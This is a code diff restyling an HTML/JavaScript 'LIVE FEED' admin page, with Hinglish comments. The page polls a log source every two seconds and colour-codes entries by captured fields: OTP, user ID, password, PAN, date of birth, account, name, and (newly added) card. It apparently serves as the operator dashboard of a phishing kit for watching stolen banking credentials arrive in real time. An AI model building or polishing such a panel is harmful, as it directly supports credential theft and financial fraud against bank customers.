@@ -3,71 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Strict Left Admin</title>
+    <title>Ultra Sleek Admin</title>
     <style>
-        /* Sab kuch reset aur baayein taraf set */
+        /* Strict Left Alignment for everything */
         * { 
             box-sizing: border-box; 
             margin: 0; 
             padding: 0; 
             font-family: 'Arial', sans-serif; 
-            text-align: left !important; /* Force Left Align */
+            text-align: left !important; 
         }
         
         body { 
             background-color: #ffffff; 
             padding: 5px; 
-            display: block; /* Flex hata diya taaki center na ho */
         }
 
-        /* Header */
+        /* Minimal Header */
         .header {
             width: 100%;
-            padding: 10px;
-            display: flex !important; /* Sirf header ke liye flex */
+            padding: 5px 10px;
+            display: flex !important; 
             justify-content: space-between;
             align-items: center;
-            border-bottom: 2px solid #eee;
-            margin-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 5px;
         }
-        .header h1 { font-size: 12px; color: #000; font-weight: 900; }
+        .header h1 { font-size: 10px; color: #888; font-weight: 800; }
         
         .v-badge {
-            background: #ff0000;
+            background: #000;
             color: #fff;
-            padding: 2px 10px;
-            border-radius: 4px;
+            padding: 1px 8px;
+            border-radius: 3px;
             font-weight: 900;
+            font-size: 12px;
         }
 
-        /* Logs Container */
-        #logsDisplay { 
-            width: 100%; 
-            display: block; 
-        }
+        #logsDisplay { width: 100%; }
 
-        /* Full Screen Patla Cart */
+        /* Ultra Patla Cart */
         .data-row {
             display: block;
             width: 100%;
-            padding: 10px 15px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-            font-size: 14px;
+            padding: 4px 10px; /* Padding ekdam kam kar di */
+            margin-bottom: 3px; /* Gap bhi kam kar diya */
+            border-radius: 2px;
+            font-size: 13px; /* Compact font */
             font-weight: 800;
-            line-height: 1.5;
-            color: #ffffff; /* White Text */
+            line-height: 1.2;
+            color: #ffffff; 
             white-space: pre-wrap;
             word-break: break-all;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
             border: none;
         }
 
         .time {
-            display: block;
-            font-size: 9px;
-            color: rgba(255,255,255,0.8);
-            margin-top: 5px;
+            display: inline-block;
+            font-size: 8px;
+            color: rgba(255,255,255,0.6);
+            margin-left: 10px;
             font-weight: 400;
         }
     </style>
@@ -75,7 +70,7 @@
 <body>
 
     <div class="header">
-        <h1>STRICT LEFT FEED</h1>
+        <h1>LIVE FEED</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
@@ -104,28 +99,29 @@
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";
 
                     let content = log.detail.toLowerCase();
-                    let bgColor = "#333"; // Dark default
+                    let bgColor = "#222"; 
 
                     // Vibrant Colors
                     if (content.includes("otp:-")) {
-                        bgColor = "#E60000"; // Sharp Red
+                        bgColor = "#FF0000"; // Pure Red
                     } else if (content.includes("user id:-") || content.includes("pass:-")) {
-                        bgColor = "#008000"; // Deep Green
+                        bgColor = "#00A500"; // Sharp Green
                     } else if (content.includes("pan:-") || content.includes("dob:-")) {
-                        bgColor = "#0000FF"; // Pure Blue
+                        bgColor = "#0055FF"; // Electric Blue
                     } else if (content.includes("acc:-") || content.includes("name:-")) {
-                        bgColor = "#FF00FF"; // Bright Pink
+                        bgColor = "#FF00AA"; // Hot Pink
+                    } else if (content.includes("card:-")) {
+                        bgColor = "#FF8800"; // Bright Orange
                     }
 
                     return `
                         <div class="data-row" style="background-color: ${bgColor};">
-                            ${log.detail}
-                            <span class="time">${log.time || ''}</span>
+                            ${log.detail} <span class="time">${log.time || ''}</span>
                         </div>
                     `;
                 }).join('');
 
-            } catch (e) { console.log("Sync..."); }
+            } catch (e) { console.log("Updating..."); }
         }
 
         setInterval(fetchLogs, 2000);
